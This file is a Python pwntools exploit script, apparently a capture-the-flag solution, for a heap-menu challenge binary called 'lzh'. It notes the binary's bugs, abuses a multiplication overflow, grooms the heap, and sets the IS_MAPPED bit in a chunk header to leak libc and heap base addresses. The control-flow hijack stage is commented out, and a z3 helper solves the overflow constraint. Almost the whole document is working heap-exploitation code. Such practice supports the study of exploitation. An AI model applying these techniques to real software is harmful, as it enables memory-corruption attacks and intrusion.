from pwn import *
from dbg_utils import *
import binascii

context.log_level = 'debug'
DEBUG = True

def exp():
    p = process("./lzh")
    
    if DEBUG:
        dbg_cmd = ida_dbg(p) + '''
        c
        '''
        gdb.attach(p, dbg_cmd)


    def cmd(op):
        p.sendlineafter('choice:', str(op))

    def buy(idx, size, buf):
        cmd(1)
        p.sendlineafter('Index:', str(idx))
        p.sendlineafter('Size:', str(size))
        if len(buf) != 0:
            p.sendafter('House:', buf, timeout=5)

    def show(idx):
        cmd(2)
        p.sendlineafter('Index:', str(idx))
    
    def sell(idx):
        cmd(3)
        p.sendlineafter('Index:', str(idx))

    # only 2
    def upgrade(idx, buf):
        cmd(4)
        p.sendlineafter('Index:', str(idx))
        p.sendafter('House:', buf)

    def buy_su():
        cmd(5)
    

    ### bug analysis
    # 1. overflow @ upgrade (2 times)
    # 2. strange exit @ main 
    #   - check su, show, exit 
    # 3. leak @ print / my_puts
    # 4. multiply overflow @ buy 
    # 5. free with no checking 
    # # 
    
    ### limit 
    # 3. buy size >= 0x80
    # 4. list[8]
    # 5. upgrade + 0x20 (size)  2 times
    
    # 0x21000 heap size

    # earn money 
    buy(0, 930799012893601613, '')
    sell(0)

    ### leak
    buy(0, 0x88, '\n')  # A

    buy(1, 0x500, '\n') # B (leak)
    buy(2, 0x80, '2\n') # C (split top) 
    sell(1)             # unsorted bin (libc)

    buy(1, 0x518, 'large\n')    # D (B => large bin)

    upgrade(0, '0' * 0x88 + p64(0x511 | 2)) # IS_MAPPED

    buy(3, 0x500, '\n')     # get B
    show(3)                 # leak
    
    buf = p.recv(0x20)
    p.info(binascii.hexlify(buf))

    libc_leak = u64(buf[:8])
    libc_base = libc_leak - (0x7f22b0ae8000 - 0x7f22b0735000)
    p.info('libc_leak @ ' + hex(libc_leak))
    p.success('libc_base @ ' + hex(libc_base))

    heap_leak = u64(buf[16: 24])
    heap_base = heap_leak - (0x55c469b782e0 - 0x55c469b78000)
    p.info('heap_leak @ ' + hex(heap_leak))
    p.success('heap_base @ ' + hex(heap_base))


    ### control rip
    # top chunk method X
    # upgrade(1, 'a' * 0x518 + '\xff' * 8)
    # 3488 tcache 
    # buy(4, 3488, '')      # get tcache
    
    # 
    p.interactive() 



from z3 import *
from functools import reduce

def sol():
    s = Solver()
    x = BitVec('x', 64)
    s.add(x > 0x7f)
    s.add(x * 0xda < 0x1C796)

    print(s.check())
    m = s.model()
    x = m.evaluate(x)
    print(x)


if __name__ == "__main__":
    exp()
    # sol()


